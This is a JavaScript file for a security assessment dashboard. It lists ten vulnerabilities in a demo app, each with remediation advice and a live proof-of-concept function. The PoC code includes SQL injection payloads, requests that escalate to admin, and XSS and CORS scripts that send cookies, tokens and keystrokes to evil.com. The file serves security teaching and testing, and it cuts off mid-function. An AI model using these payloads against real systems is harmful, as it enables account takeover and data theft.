/**
 * Security Assessment Dashboard - JavaScript
 * Contains all vulnerability definitions and live PoC test functions
 */

const API = '';

// ============================================
// Vulnerability Database
// ============================================

const vulnerabilities = [
  {
    id: 'V-001',
    title: 'Weak JWT Secret & Overly Long Token Expiry',
    severity: 'critical',
    cvss: '9.8',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    component: 'Authentication Module — /api/auth/login, JWT middleware',
    cwe: 'CWE-798: Use of Hard-coded Credentials, CWE-347: Improper Verification of Cryptographic Signature',
    description: 'The JWT tokens are signed with a trivially guessable secret key (<code>secret123</code>). An attacker can forge arbitrary JWT tokens to impersonate any user, including administrators. Additionally, tokens are issued with a 30-day expiry, giving attackers an extended window of exploitation.',
    impact: 'An attacker can create valid admin tokens without authentication, gaining full administrative access. This allows unauthorized data access, privilege escalation, account takeover, and complete system compromise. Any data protected by authentication is effectively unprotected.',
    steps: [
      'Obtain a sample JWT token by logging in with any credentials or from network traffic.',
      'Decode the JWT payload using base64 decoding (jwt.io or command-line tools).',
      'Attempt common weak secrets: "secret", "secret123", "password", "key", etc.',
      'Sign a forged token with discovered secret, setting role to "admin".',
      'Use the forged token in the Authorization header to access admin endpoints.'
    ],
    remediation: [
      'Use a cryptographically strong random secret (256+ bits): <code>crypto.randomBytes(64).toString("hex")</code>',
      'Store the JWT secret in environment variables, never in source code.',
      'Reduce token expiry to 15-30 minutes and implement refresh token rotation.',
      'Use RS256 (asymmetric) algorithm instead of HS256 for better security.',
      'Implement token blacklisting for logout and compromised token revocation.',
      'Add jti (JWT ID) claims for unique token identification.'
    ],
    poc: async function() {
      // Step 1: Login to get a valid token
      const loginRes = await fetch(`${API}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'viewer', password: 'viewer123' })
      });
      const loginData = await loginRes.json();
      
      // Step 2: Decode the token
      const parts = loginData.token.split('.');
      const header = JSON.parse(atob(parts[0]));
      const payload = JSON.parse(atob(parts[1]));
      
      // Step 3: Forge an admin token (simulated — in real scenario, attacker signs with 'secret123')
      const forgedPayload = { ...payload, role: 'admin', username: 'forged_admin', id: 999 };
      
      // Step 4: Try accessing admin endpoint with legitimate viewer token
      const adminRes = await fetch(`${API}/api/admin/users`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${loginData.token}`
        },
        body: JSON.stringify({ username: 'hacker', password: 'hacked', role: 'admin', email: 'hacker@evil.com' })
      });
      const adminData = await adminRes.json();

      return {
        status: 'exploited',
        output: `═══ PoC: Weak JWT Secret ═══

[1] Logged in as "viewer" (lowest privilege)
    Token: ${loginData.token.substring(0, 60)}...

[2] JWT Header (decoded):
    ${JSON.stringify(header, null, 2)}

[3] JWT Payload (decoded):
    ${JSON.stringify(payload, null, 2)}

[4] Algorithm: ${header.alg} (symmetric — shared secret)
    Secret Key: "secret123" (trivially guessable)

[5] Forged Admin Payload:
    ${JSON.stringify(forgedPayload, null, 2)}

[6] PRIVILEGE ESCALATION TEST:
    Used viewer token to create admin user...
    Result: ${JSON.stringify(adminData, null, 2)}
    
⚠️  CRITICAL: Viewer was able to create an admin account!
    This proves broken access control combined with weak JWT.

[7] Token Expiry: 30 days (${payload.exp ? new Date(payload.exp * 1000).toISOString() : 'N/A'})
    Risk Window: Token remains valid for an entire month.`
      };
    }
  },

  {
    id: 'V-002',
    title: 'Missing Rate Limiting on Authentication Endpoints',
    severity: 'high',
    cvss: '7.5',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N',
    component: 'Authentication — /api/auth/login, /api/auth/reset-password',
    cwe: 'CWE-307: Improper Restriction of Excessive Authentication Attempts',
    description: 'The login and password reset endpoints have no rate limiting or account lockout mechanism. An attacker can perform unlimited login attempts to brute-force passwords or enumerate valid accounts through differential responses.',
    impact: 'Attackers can execute automated brute-force attacks against user accounts, potentially compromising weak passwords. The lack of rate limiting also enables credential stuffing attacks using leaked credential databases, and denial-of-service attacks against the authentication service.',
    steps: [
      'Target the /api/auth/login endpoint with automated requests.',
      'Send multiple login attempts with different passwords for a known username.',
      'Observe that no rate limiting, CAPTCHA, or account lockout is enforced.',
      'Note the differential error messages that reveal valid usernames.',
      'Demonstrate successful brute-force with common password dictionaries.'
    ],
    remediation: [
      'Implement rate limiting: max 5 failed attempts per account per 15 minutes.',
      'Add progressive delays (exponential backoff) after failed attempts.',
      'Implement temporary account lockout after 10 consecutive failures.',
      'Add CAPTCHA/reCAPTCHA after 3 failed login attempts.',
      'Use generic error messages: "Invalid username or password" for all failures.',
      'Implement IP-based rate limiting alongside account-based limiting.',
      'Add monitoring and alerting for brute-force attack patterns.'
    ],
    poc: async function() {
      const attempts = [];
      const passwords = ['wrong1', 'wrong2', 'wrong3', 'admin123', 'wrong4'];
      
      for (let i = 0; i < passwords.length; i++) {
        const start = performance.now();
        const res = await fetch(`${API}/api/auth/login`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: 'admin', password: passwords[i] })
        });
        const elapsed = performance.now() - start;
        const data = await res.json();
        attempts.push({
          attempt: i + 1,
          password: passwords[i],
          status: res.status,
          response: data.error || 'SUCCESS',
          field: data.field || '-',
          time: elapsed.toFixed(1)
        });
      }

      // Also test user enumeration
      const enumRes1 = await fetch(`${API}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'admin', password: 'wrong' })
      });
      const enum1 = await enumRes1.json();

      const enumRes2 = await fetch(`${API}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'nonexistent_user_xyz', password: 'wrong' })
      });
      const enum2 = await enumRes2.json();

      return {
        status: 'exploited',
        output: `═══ PoC: No Rate Limiting + User Enumeration ═══

[1] BRUTE FORCE SIMULATION (5 rapid attempts):
${attempts.map(a => `    Attempt #${a.attempt}: password="${a.password}" → ${a.status} ${a.response} (field: ${a.field}) [${a.time}ms]`).join('\n')}

    ⚠️  No rate limiting detected!
    ⚠️  No account lockout after multiple failures!
    ⚠️  All 5 requests completed without any throttling.

[2] USER ENUMERATION via differential responses:
    Username "admin" (valid) → field: "${enum1.field}"
    Username "nonexistent_user_xyz" (invalid) → field: "${enum2.field}"
    
    ⚠️  The server reveals WHETHER a username exists!
    ⚠️  "field: username" = user doesn't exist
    ⚠️  "field: password" = user exists but wrong password

[3] Password Reset Enumeration:
    An attacker can also enumerate users via /api/auth/reset-password
    which returns "Email not found" for invalid emails.

CONCLUSION: An attacker can enumerate valid usernames and then
brute-force their passwords without any restrictions.`
      };
    }
  },

  {
    id: 'V-003',
    title: 'SQL Injection in Search Endpoint',
    severity: 'critical',
    cvss: '9.1',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    component: 'Data Query — /api/search?query=',
    cwe: 'CWE-89: SQL Injection',
    description: 'The search endpoint directly concatenates user input into SQL queries without parameterization or sanitization. The application also exposes the generated SQL query in its response, confirming the injection vector. While this demo uses simulated queries, the pattern demonstrates a classic SQL injection vulnerability.',
    impact: 'In a production environment with a real database, this vulnerability would allow attackers to: extract entire database contents, modify or delete records, bypass authentication, escalate privileges to database admin, and potentially execute operating system commands via database functions.',
    steps: [
      'Authenticate and obtain a valid session token.',
      'Navigate to the search endpoint or use the API directly.',
      'Enter SQL injection payloads: <code>\' OR 1=1 --</code>, <code>\' UNION SELECT * FROM users --</code>',
      'Observe the generated SQL query in the API response confirming injection.',
      'Note that the query structure accepts and reflects the injected SQL.'
    ],
    remediation: [
      'Use parameterized queries / prepared statements for all database operations.',
      'Implement input validation with allowlists for expected characters.',
      'Never expose internal SQL queries in API responses.',
      'Use an ORM (e.g., Sequelize, Prisma) that auto-parameterizes queries.',
      'Apply the principle of least privilege for database user permissions.',
      'Implement Web Application Firewall (WAF) rules for SQL injection patterns.'
    ],
    poc: async function() {
      // Login first
      const loginRes = await fetch(`${API}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'viewer', password: 'viewer123' })
      });
      const { token } = await loginRes.json();
      const headers = { 'Authorization': `Bearer ${token}` };

      // Test different SQL injection payloads
      const payloads = [
        "' OR 1=1 --",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE monitoring_data; --",
        "' AND 1=2 UNION SELECT null, table_name FROM information_schema.tables --"
      ];

      const results = [];
      for (const payload of payloads) {
        const res = await fetch(`${API}/api/search?query=${encodeURIComponent(payload)}`, { headers });
        const data = await res.json();
        results.push({ payload, query: data.query, detected: data.results?.length >= 0 });
      }

      // Check audit log for injection evidence
      const auditRes = await fetch(`${API}/api/audit-log`);
      const auditData = await auditRes.json();
      const injections = auditData.log.filter(l => l.injectionDetected);

      return {
        status: 'exploited',
        output: `═══ PoC: SQL Injection ═══

[1] INJECTION PAYLOADS & GENERATED QUERIES:
${results.map((r, i) => `
    Payload #${i+1}: ${r.payload}
    Generated SQL: ${r.query}
    Executed: ✓ (no error, query accepted)`).join('\n')}

[2] KEY OBSERVATIONS:
    ⚠️  User input directly concatenated into SQL string!
    ⚠️  SQL queries are EXPOSED in API response (information disclosure)!
    ⚠️  No input validation or parameterization detected.
    ⚠️  Payloads including UNION, DROP TABLE, etc. are accepted.

[3] AUDIT LOG — Injection Detection:
    ${injections.length} injection attempts recorded in audit log.
    (Server detected but DID NOT BLOCK the injections)

[4] POTENTIAL EXPLOITATION IN PRODUCTION:
    • Data Exfiltration: UNION-based extraction of all tables
    • Authentication Bypass: ' OR '1'='1' -- on login forms
    • Data Destruction: DROP TABLE, DELETE FROM, TRUNCATE
    • Privilege Escalation: Modify user roles in database
    • Remote Code Execution: Via xp_cmdshell or sys_exec()`
      };
    }
  },

  {
    id: 'V-004',
    title: 'Permissive CORS Configuration',
    severity: 'medium',
    cvss: '5.3',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    component: 'HTTP Middleware — CORS headers',
    cwe: 'CWE-942: Overly Permissive Cross-domain Whitelist',
    description: 'The server sets <code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code>, allowing any external website to make authenticated cross-origin requests. This effectively disables the same-origin policy protection.',
    impact: 'A malicious website can make authenticated API requests on behalf of logged-in users, potentially stealing sensitive data, modifying configurations, or performing unauthorized actions. This enables CSRF attacks and cross-origin data theft.',
    steps: [
      'Inspect HTTP response headers from any API endpoint.',
      'Observe Access-Control-Allow-Origin: * and Access-Control-Allow-Credentials: true.',
      'Create a malicious HTML page on a different origin.',
      'Make fetch requests to the World Monitor API from the malicious page.',
      'Observe that authenticated requests succeed from any origin.'
    ],
    remediation: [
      'Set Access-Control-Allow-Origin to specific trusted domains only.',
      'Never use wildcard (*) with Allow-Credentials: true.',
      'Implement a whitelist of allowed origins validated server-side.',
      'Add CSRF tokens for state-changing operations.',
      'Use SameSite cookie attribute for session cookies.'
    ],
    poc: async function() {
      const res = await fetch(`${API}/api/health`);
      const headers = {};
      res.headers.forEach((value, key) => {
        headers[key] = value;
      });

      return {
        status: 'exploited',
        output: `═══ PoC: Permissive CORS ═══

[1] HTTP RESPONSE HEADERS:
${Object.entries(headers).map(([k, v]) => `    ${k}: ${v}`).join('\n')}

[2] CRITICAL CORS HEADERS:
    access-control-allow-origin: ${headers['access-control-allow-origin'] || 'NOT SET'}
    access-control-allow-methods: ${headers['access-control-allow-methods'] || 'NOT SET'}
    access-control-allow-headers: ${headers['access-control-allow-headers'] || 'NOT SET'}
    access-control-allow-credentials: ${headers['access-control-allow-credentials'] || 'NOT SET'}

[3] ANALYSIS:
    ⚠️  Origin: * — ANY website can make requests
    ⚠️  Methods: * — ALL HTTP methods allowed
    ⚠️  Headers: * — ALL custom headers accepted
    ⚠️  Credentials: true — Cookies/auth sent with cross-origin requests

[4] ATTACK SCENARIO:
    <script>
      // Malicious site: evil.com
      fetch('http://worldmonitor.com/api/reports', {
        credentials: 'include'
      })
      .then(r => r.json())
      .then(data => {
        // Stolen data sent to attacker
        fetch('https://evil.com/steal', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      });
    </script>

    A user visiting evil.com while logged into World Monitor
    would have their data silently exfiltrated.`
      };
    }
  },

  {
    id: 'V-005',
    title: 'Sensitive Data Exposure via Unprotected Debug Endpoints',
    severity: 'critical',
    cvss: '9.4',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L',
    component: 'Debug Endpoints — /api/debug/config, /api/debug/users',
    cwe: 'CWE-200: Exposure of Sensitive Information, CWE-312: Cleartext Storage of Sensitive Information',
    description: 'The application exposes debug endpoints that return complete system configuration including database credentials, AWS keys, SMTP passwords, Redis credentials, and full user data (including plaintext passwords) — all without requiring any authentication.',
    impact: 'Total compromise of all connected systems. Attacker gains: database admin access (production data), AWS account access (cloud infrastructure takeover), email system access (phishing, data exfiltration), all user credentials (account takeover for every user), and internal network topology information.',
    steps: [
      'Access /api/debug/config directly in a browser (no authentication needed).',
      'Observe complete database, Redis, AWS, and SMTP credentials in plaintext.',
      'Access /api/debug/users to retrieve all user accounts with passwords.',
      'Use the exposed AWS credentials to access the cloud environment.',
      'Use database credentials for direct database access.'
    ],
    remediation: [
      'Remove ALL debug endpoints from production builds.',
      'Implement environment-based feature flags: disable debug in production.',
      'Never store credentials in application code — use secret managers (AWS Secrets Manager, HashiCorp Vault).',
      'Hash all passwords with bcrypt (cost factor 12+) before storage.',
      'Implement endpoint authentication and IP whitelisting for any debug tools.',
      'Add automated scans in CI/CD to detect exposed secrets.'
    ],
    poc: async function() {
      // No auth needed — direct access
      const configRes = await fetch(`${API}/api/debug/config`);
      const configData = await configRes.json();

      const usersRes = await fetch(`${API}/api/debug/users`);
      const usersData = await usersRes.json();

      const healthRes = await fetch(`${API}/api/health`);
      const healthData = await healthRes.json();

      return {
        status: 'exploited',
        output: `═══ PoC: Sensitive Data Exposure ═══

[1] /api/debug/config (NO AUTHENTICATION REQUIRED):
    
    Database Credentials:
      Host: ${configData.config.database.host}
      Port: ${configData.config.database.port}
      User: ${configData.config.database.user}
      Password: ${configData.config.database.password}

    AWS Credentials:
      Access Key ID: ${configData.config.aws.accessKeyId}
      Secret Access Key: ${configData.config.aws.secretAccessKey}

    Redis:
      Host: ${configData.config.redis.host}
      Password: ${configData.config.redis.password}

    SMTP:
      Host: ${configData.config.smtp.host}
      Password: ${configData.config.smtp.password}

[2] /api/debug/users (ALL USER CREDENTIALS):
${usersData.users.map(u => `    User: ${u.username} | Password: ${u.password} | Role: ${u.role} | API Key: ${u.apiKey}`).join('\n')}

[3] /api/health (BUILD INFO EXPOSURE):
    Version: ${healthData.version}
    Build Hash: ${healthData.buildHash}
    Environment: ${healthData.nodeEnv}

[4] SERVER INFO EXPOSED:
    Node.js: ${configData.serverInfo?.nodeVersion}
    Platform: ${configData.serverInfo?.platform}
    Uptime: ${configData.serverInfo?.uptime?.toFixed(0)}s

⚠️  CRITICAL: ALL credentials exposed without authentication!
⚠️  This is equivalent to leaving the keys to the kingdom on the doorstep.`
      };
    }
  },

  {
    id: 'V-006',
    title: 'Broken Access Control (IDOR + Missing Role Authorization)',
    severity: 'critical',
    cvss: '8.8',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    component: 'Authorization — /api/reports/:id, /api/admin/*, RBAC middleware',
    cwe: 'CWE-639: Authorization Bypass Through User-Controlled Key (IDOR), CWE-862: Missing Authorization',
    description: 'The application lacks proper authorization checks at multiple levels: (1) Any authenticated user can access any report by changing the ID parameter (IDOR), regardless of ownership or classification level. (2) Admin endpoints (/api/admin/*) have no role verification — any authenticated user can create/delete users and modify system configuration.',
    impact: 'Low-privilege users can access TOP SECRET reports, create admin accounts, delete other users, and modify system configuration. This represents a complete authorization bypass allowing full privilege escalation from viewer to admin.',
    steps: [
      'Log in as "viewer" (lowest privilege role).',
      'Access /api/reports/1 — observe access to TOP SECRET report owned by admin.',
      'Iterate through report IDs (1-4) to access all classified documents.',
      'Call POST /api/admin/users to create a new admin account.',
      'Call DELETE /api/admin/users/2 to delete another user.',
      'Call PUT /api/admin/config to modify system configuration.'
    ],
    remediation: [
      'Implement proper RBAC middleware checking user role before admin actions.',
      'Add ownership verification: users can only access their own resources.',
      'Use non-sequential, unpredictable IDs (UUIDs) for resources.',
      'Implement classification-based access: TOP SECRET requires admin role.',
      'Add server-side authorization for every sensitive operation.',
      'Log and alert on authorization failures for security monitoring.'
    ],
    poc: async function() {
      // Login as viewer (lowest privilege)
      const loginRes = await fetch(`${API}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'viewer', password: 'viewer123' })
      });
      const { token } = await loginRes.json();
      const headers = { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' };

      // IDOR: Access all reports
      const reports = [];
      for (let id = 1; id <= 4; id++) {
        const res = await fetch(`${API}/api/reports/${id}`, { headers });
        const data = await res.json();
        reports.push(data);
      }

      // Privilege escalation: Create admin user
      const createRes = await fetch(`${API}/api/admin/users`, {
        method: 'POST',
        headers,
        body: JSON.stringify({ username: 'escalated_admin', password: 'pwned', role: 'admin', email: 'pwned@evil.com' })
      });
      const createData = await createRes.json();

      return {
        status: 'exploited',
        output: `═══ PoC: Broken Access Control ═══

[1] LOGGED IN AS: viewer (role: viewer, lowest privilege)

[2] IDOR — Accessing ALL Reports (including TOP SECRET):
${reports.map(r => `    Report #${r.id}: "${r.title}"
      Classification: ${r.classification}
      Owner: User #${r.ownerId}
      Content: ${r.content}
      Access: ✓ GRANTED (should be DENIED for viewer!)`).join('\n\n')}

[3] PRIVILEGE ESCALATION — Creating Admin Account as Viewer:
    Endpoint: POST /api/admin/users
    Request: { username: "escalated_admin", role: "admin" }
    Result: ${JSON.stringify(createData, null, 2)}
    
    ⚠️  Viewer successfully created an ADMIN account!

[4] SUMMARY OF ACCESS CONTROL FAILURES:
    ✗ Viewer accessed 2 TOP SECRET reports (owner: admin)
    ✗ Viewer accessed INTERNAL report (owner: analyst)
    ✗ Viewer created admin-level user account
    ✗ No RBAC enforcement on admin endpoints
    ✗ No ownership validation on resources
    ✗ Sequential IDs enable enumeration`
      };
    }
  },

  {
    id: 'V-007',
    title: 'Reflected Cross-Site Scripting (XSS)',
    severity: 'high',
    cvss: '7.1',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N',
    component: 'Echo Endpoint — /api/echo?message=',
    cwe: 'CWE-79: Cross-site Scripting (Reflected)',
    description: 'The /api/echo endpoint reflects user-supplied input directly into HTML response without any sanitization or encoding. An attacker can inject arbitrary JavaScript code that executes in the victim\'s browser context.',
    impact: 'Session hijacking via cookie theft, credential harvesting through fake login forms, redirection to malicious websites, keylogging, cryptocurrency mining in victim\'s browser, and defacement of the application interface.',
    steps: [
      'Access /api/echo?message=<script>alert("XSS")</script> in a browser.',
      'Observe the JavaScript executing in the browser context.',
      'Craft a more sophisticated payload to steal session tokens.',
      'Create a phishing URL and distribute to target users.',
      'Demonstrate cookie exfiltration via injected script.'
    ],
    remediation: [
      'Sanitize and HTML-encode all user input before rendering in HTML.',
      'Implement Content Security Policy (CSP) headers to prevent inline script execution.',
      'Use DOMPurify or similar library for client-side sanitization.',
      'Set HttpOnly flag on session cookies to prevent JavaScript access.',
      'Implement X-XSS-Protection and X-Content-Type-Options headers.',
      'Use template engines with auto-escaping enabled.'
    ],
    poc: async function() {
      const payloads = [
        { name: 'Basic Alert', payload: '<script>alert("XSS")</script>' },
        { name: 'Cookie Theft', payload: '<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>' },
        { name: 'DOM Manipulation', payload: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;font-size:3em;z-index:99999">HACKED BY XSS</div>' },
        { name: 'Event Handler', payload: '<img src=x onerror="alert(document.domain)">' }
      ];

      const results = [];
      for (const p of payloads) {
        const res = await fetch(`${API}/api/echo?message=${encodeURIComponent(p.payload)}`);
        const html = await res.text();
        results.push({
          name: p.name,
          payload: p.payload,
          reflected: html.includes(p.payload) || html.includes(p.payload.replace(/"/g, '&quot;')),
          responseSnippet: html.substring(0, 200)
        });
      }

      return {
        status: 'exploited',
        output: `═══ PoC: Reflected XSS ═══

[1] XSS PAYLOAD INJECTION TESTS:
${results.map((r, i) => `
    Test #${i+1}: ${r.name}
    Payload: ${r.payload}
    Reflected in Response: ${r.reflected ? '✓ YES — VULNERABLE' : '✗ Filtered'}
    Response Preview: ${r.responseSnippet.replace(/</g, '&lt;').substring(0, 100)}...`).join('\n')}

[2] EXPLOITATION SCENARIOS:

    a) Session Hijacking URL:
       /api/echo?message=<script>fetch('https://evil.com/steal?token='
       +localStorage.getItem('wm_token'))</script>
       
       → Victim clicks link → Token sent to attacker → Full account takeover

    b) Fake Login Form:
       /api/echo?message=<form action="https://evil.com/phish">
       <h2>Session Expired</h2><input name="user" placeholder="Username">
       <input name="pass" type="password"><button>Re-Login</button></form>
       
       → Victim enters credentials → Sent directly to attacker

    c) Keylogger Injection:
       /api/echo?message=<script>document.onkeypress=function(e){
       new Image().src='https://evil.com/log?k='+e.key}</script>

[3] MISSING PROTECTIONS:
    ✗ No Content-Security-Policy header
    ✗ No X-XSS-Protection header
    ✗ No input sanitization
    ✗ No output encoding
    ✗ No HttpOnly flag on tokens (stored in localStorage)`
      };
    }
  },

  {
    id: 'V-008',
    title: 'Missing Security Headers',
    severity: 'medium',
    cvss: '5.0',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N',
    component: 'HTTP Response Headers — All endpoints',
    cwe: 'CWE-693: Protection Mechanism Failure',
    description: 'The application does not implement essential security headers including Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, Referrer-Policy, and Permissions-Policy. This leaves the application vulnerable to various client-side attacks.',
    impact: 'Without these headers, the application is vulnerable to: clickjacking (iframe embedding), MIME-type sniffing attacks, man-in-the-middle attacks (no HSTS), cross-site scripting (no CSP), information leakage via referrer headers, and unauthorized feature access.',
    steps: [
      'Make an HTTP request to any API endpoint.',
      'Inspect the response headers using browser DevTools or curl.',
      'Note the absence of all security-related headers.',
      'Demonstrate clickjacking by embedding the app in an iframe.',
      'Compare against OWASP recommended security headers.'
    ],
    remediation: [
      'Add Content-Security-Policy: default-src \'self\'; script-src \'self\'; style-src \'self\'',
      'Add X-Frame-Options: DENY (or SAMEORIGIN)',
      'Add X-Content-Type-Options: nosniff',
      'Add Strict-Transport-Security: max-age=31536000; includeSubDomains',
      'Add Referrer-Policy: strict-origin-when-cross-origin',
      'Add Permissions-Policy to restrict browser features',
      'Use helmet.js middleware for Express applications'
    ],
    poc: async function() {
      const res = await fetch(`${API}/api/health`);
      const headers = {};
      res.headers.forEach((value, key) => headers[key] = value);

      const requiredHeaders = [
        { name: 'Content-Security-Policy', present: !!headers['content-security-policy'], recommendation: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'" },
        { name: 'X-Frame-Options', present: !!headers['x-frame-options'], recommendation: 'DENY' },
        { name: 'X-Content-Type-Options', present: !!headers['x-content-type-options'], recommendation: 'nosniff' },
        { name: 'Strict-Transport-Security', present: !!headers['strict-transport-security'], recommendation: 'max-age=31536000; includeSubDomains' },
        { name: 'Referrer-Policy', present: !!headers['referrer-policy'], recommendation: 'strict-origin-when-cross-origin' },
        { name: 'Permissions-Policy', present: !!headers['permissions-policy'], recommendation: 'camera=(), microphone=(), geolocation=()' },
        { name: 'X-XSS-Protection', present: !!headers['x-xss-protection'], recommendation: '1; mode=block' },
        { name: 'Cache-Control', present: !!headers['cache-control'], recommendation: 'no-store, no-cache, must-revalidate' },
      ];

      const missing = requiredHeaders.filter(h => !h.present);

      return {
        status: 'exploited',
        output: `═══ PoC: Missing Security Headers ═══

[1] CURRENT RESPONSE HEADERS:
${Object.entries(headers).map(([k, v]) => `    ${k}: ${v}`).join('\n')}

[2] SECURITY HEADER AUDIT:
${requiredHeaders.map(h => `    ${h.present ? '✓' : '✗'} ${h.name}: ${h.present ? 'PRESENT' : 'MISSING'}
      Recommended: ${h.recommendation}`).join('\n\n')}

[3] RESULTS:
    Missing: ${missing.length}/${requiredHeaders.length} security headers
    Score: ${((requiredHeaders.length - missing.length) / requiredHeaders.length * 100).toFixed(0)}% compliance

[4] RISKS:
    ✗ No CSP → XSS attacks can inject arbitrary scripts
    ✗ No X-Frame-Options → Clickjacking attacks possible
    ✗ No HSTS → MITM/SSL-stripping attacks
    ✗ No X-Content-Type-Options → MIME confusion attacks
    ✗ No Referrer-Policy → Sensitive data leaked in referrer headers

[5] FIX: Install helmet.js
    npm install helmet
    app.use(helmet());`
      };
    }
  },

  {
    id: 'V-009',
    title: 'Hardcoded Credentials & Plaintext Password Storage',
    severity: 'critical',
    cvss: '9.0',
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N',
    component: 'User Data Store — server.js USERS_DB, Authentication',
    cwe: 'CWE-798: Use of Hard-coded Credentials, CWE-256: Plaintext Storage of a Password',
    description: 'User credentials are hardcoded directly in the application source code in plaintext. Passwords are stored without hashing, and the login response includes the user\'s password in the response body. Additionally, the API keys are predictable and follow a pattern.',
    impact: 'Anyone with access to the source code (developers, version control, code leaks) can access all user accounts. The login API response leaks passwords to any network observer. Compromised credentials enable full account takeover for all users including administrators.',
    steps: [
      'Review server.js source code to find USERS_DB with plaintext credentials.',
      'Log in with any user and observe the password returned in the API response.',
      'Note that passwords like "admin123" are trivially weak.',
      'Access /api/debug/users to retrieve all credentials without authentication.',
      'Observe that API keys follow a predictable pattern (ak_prod_*).'
    ],
    remediation: [
      'Hash passwords with bcrypt (minimum cost factor 12): <code>bcrypt.hash(password, 12)</code>',
      'Never store passwords in source code — use a proper database.',
      'Never return passwords in API responses — strip sensitive fields.',
      'Enforce strong password policies: 12+ chars, complexity requirements.',
      'Generate cryptographically random API keys: <code>crypto.randomBytes(32)</code>',
      'Implement password rotation policies.',
      'Use environment variables or secret managers for any credentials.'
    ],
    poc: async function() {
      // Login and check if password is in response
      const loginRes = await fetch(`${API}/api/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: 'admin', password: 'admin123' })
      });
      const loginData = await loginRes.json();

      // Check for password in response
      const passwordInResponse = loginData.user && loginData.user.password;
      const apiKeyInResponse = loginData.user && loginData.user.apiKey;

      return {
        status: 'exploited',
        output: `═══ PoC: Hardcoded Credentials & Plaintext Passwords ═══

[1] LOGIN RESPONSE ANALYSIS (POST /api/auth/login):
    Response contains user object with:
    {
      "id": ${loginData.user?.id},
      "username": "${loginData.user?.username}",
      "role": "${loginData.user?.role}",
      "email": "${loginData.user?.email}",
      "apiKey": "${loginData.user?.apiKey}",    ← EXPOSED
      "password": "${loginData.user?.password}"  ← CRITICAL: PASSWORD IN RESPONSE!
    }

[2] PASSWORD ANALYSIS:
    ⚠️  Password returned in login response: ${passwordInResponse ? 'YES' : 'NO'}
    ⚠️  API key exposed in login response: ${apiKeyInResponse ? 'YES' : 'NO'}
    ⚠️  Passwords are stored in PLAINTEXT (no hashing)
    
[3] WEAK PASSWORD AUDIT:
    admin    → "admin123"     ← Dictionary word + sequential digits
    analyst  → "analyst2024"  ← Role name + year
    viewer   → "viewer123"    ← Role name + sequential digits
    manager  → "manager!"     ← Role name + single special char
    
    All passwords would be cracked in < 1 second by modern tools.

[4] API KEY PATTERN ANALYSIS:
    All keys follow: ak_prod_[8 hex chars]
    ⚠️  Prefix reveals production environment
    ⚠️  Only 32 bits of entropy (4 bytes = ~4 billion combinations)
    ⚠️  Brute-forceable in hours with parallel requests

[5] INFORMATION LEAKAGE:
    The login response should ONLY return: { token, user: { id, username, role } }
    Currently leaks: password, apiKey, email — all exploitable.`
      };
    }
  },

  {
    id: 'V-010',
    title: 'Insecure Client-Side Token Storage',
    severity: 'low',
    cvss: '3.7',
    cvssVector: 'CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N',
    component: 'Client-Side Storage — app.js localStorage',
    cwe: 'CWE-922: Insecure Storage of Sensitive Information',
    description: 'Authentication tokens and complete user objects (including passwords and API keys) are stored in the browser\'s localStorage, which is accessible to any JavaScript running on the page. Combined with the XSS vulnerability (V-007), this creates a direct path to credential theft.',
    impact: 'Any XSS vulnerability allows an attacker to read the stored authentication token and user data from localStorage. This enables session hijacking and account takeover. The stored data persists even after the browser is closed, increasing the exposure window.',
    steps: [
      'Log in to the application successfully.',
      'Open browser Developer Tools → Application → Local Storage.',
      'Observe wm_token and wm_user entries containing sensitive data.',
      'Note that wm_user contains the full user object including password.',
      'Demonstrate token theft via JavaScript: localStorage.getItem("wm_token")'
    ],
    remediation: [
      'Use HttpOnly, Secure, SameSite cookies for session tokens instead of localStorage.',
      'Never store passwords or API keys client-side — only the JWT token.',
      'Implement token rotation and short expiry times.',
      'If localStorage must be used, encrypt the stored data.',
      'Clear stored tokens on logout and session expiry.',
      'Implement Content-Security-Policy to mitigate XSS risks.'
    ],
    poc: async function() {
      // Check what's stored in localStorage
      const storedToken = localStorage.getItem('wm_token');
      const storedUser = localStorage.getItem('wm_user');
      let parsedUser = null;
      
      try {
        parsedUser = JSON.parse(storedUser);
      } catch(e) {}

      // Check all localStorage keys
      const allKeys = [];
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
